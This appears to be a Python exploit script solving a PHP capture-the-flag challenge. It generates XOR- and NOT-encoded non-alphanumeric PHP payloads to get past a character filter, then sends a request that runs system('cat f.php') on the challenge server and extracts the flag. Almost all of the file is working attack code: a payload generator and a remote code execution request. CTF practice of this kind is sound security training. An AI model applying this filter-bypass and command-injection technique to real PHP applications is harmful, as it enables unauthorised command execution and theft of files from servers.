import requests
import random
from urllib.parse import quote
from pwn import *
import os
localhost = f"http://{os.popen('ip addr show enp0s3').read().split('inet ')[1].split('/')[0]}"
localport = 8080

remotehost = 'http://puzzler7.imaginaryctf.org'
remoteport = 5000
context.log_level = 'error'
local = False
host = f'{remotehost}:{remoteport}' if not local else f'{localhost}:{localport}'
__pad = lambda x: ''.join(e for e in ['"']+list(x)+['"'])
__xor = lambda x,y: ''.join(e for e in [chr( (0x7f & (ord(i)^ord(j))) | 0x20) for i,j in zip(x,y)])
valids = '!$%\'()*,-./:<=>?@[]^_`{|}~'

def verify(w1, w2):
    try:
        p = process(['php','-r',f"echo {__pad(w1)}^{__pad(w2)};"])
        recv = p.recv()
        print(f'got {recv}')
    except Exception as e:
        print(f'Exception: {e}')

def phpxor(e,d):
    try:
        p = process(['php', '-r', f'echo "{e}"^"{d}";'])
        recv = p.recv()
        if type(recv) == type(b''):
            p.close()
            return recv.decode()
    except Exception as e:
        print(f'Exception: {e}')
        p.close()

strjoin = lambda x: ''.join(e for e in x)
def xor(expected="echo$flag;", valids = list(valids)):
    global __xor
    idx = 0
    res1 = list()
    res2 = list()
    while idx < len(expected):
        random.shuffle(valids)
        exp = expected[idx]
        for i in range(len(valids)):
            c = valids[i]
            rv = phpxor(exp, c)
            if rv in valids:
                res1.append(rv)
                res2.append(c)
                idx += 1
                if phpxor(strjoin(res1), strjoin(res2)) == expected[:idx]:
                    print(f'got "{strjoin(res1)}"^"{strjoin(res2)}"="{expected[:idx]}"')
                else:
                    res1.pop()
                    res2.pop()
                    idx -= 1
    return strjoin(res1),strjoin(res2)

def ravel(data):
    res = {}
    if type(data) == type({}):
        print(f'[Warn] input is type dict.')
        return ''
    idx = data.find('?')
    if idx < 0:
        idx = 0
    data = data[idx+1:]
    params = data.split('&')
    for e in params:
        k,v = e.split('=')
        res[k] = v
    return res

def unravel(data):
    res = '/?'
    if type(data) == type(''):
        print(f'[Warn] input is type str.')
        return {}
    keys = [e for e in data.keys()]
    for i in range(len(keys)):
        k = keys[i]
        res += f'{k}={data[k]}&' if i < len(keys)-1 else f'{k}={data[k]}'
    return res

def get(host,args):
    try:
        r = requests.get(host+args)
        print(f'[{r.status_code}]: {r.text}')
        return r
    except Exception as e:
        print(f'Exception: {e}')
        return None

suffix = '$$_[_]($$_[__])'
args = f'$_=~%a0%b8%ba%ab;{suffix};'
r = requests.get(host+'/?_=system&__=cat+f.php&escape='+args)
#print(f'got: {r.text}')
flag = r.text[23:55]
print(f'flag: {flag}')
